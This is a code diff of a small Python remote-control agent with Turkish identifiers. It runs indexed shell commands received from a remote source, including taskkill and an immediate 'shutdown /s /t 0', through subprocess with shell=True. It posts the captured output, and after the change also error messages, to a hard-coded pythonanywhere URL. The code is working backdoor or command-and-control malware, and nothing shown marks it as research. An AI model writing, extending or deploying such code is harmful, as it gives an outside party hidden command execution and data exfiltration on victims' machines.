@@ -13,8 +13,9 @@ class nesne:
             "tasklist",
             "taskkill /F /IM ",
             "start ",
-            f"start file:///{os.environ["USERPROFILE"].replace("\\","/")}/",
-            "shutdown /s /t 0"
+            "start file:///{}/".format(os.environ["USERPROFILE"].replace("\\","/")),
+            "shutdown /s /t 0",
+            ""
         ]
 
     def kos(self):
@@ -31,11 +32,13 @@ class nesne:
                 self.yurut(int(hizli.decode()),arg)
             except Exception as e:
                 print(e)
+                try: req.urlopen(self.url,data=str(e).encode())
+                except: pass
 
     def yurut(self,ind,arg):
         komut = self.hizlikomutlar[ind] + arg.decode()
         cikti = subprocess.run(komut,shell=True,capture_output=True)
-        req.urlopen(self.url,data=b"<-|->\n" + cikti.stdout + b">-|-<\n" + cikti.stderr + b">-!-<\n")
+        req.urlopen(self.url,data=b"<-STDOUT->\n" + cikti.stdout + b"<-STDERR->\n" + cikti.stderr + b">---<\n")
 
 if __name__ == "__main__":
     url = "http://gghjhgfjh.pythonanywhere.com"
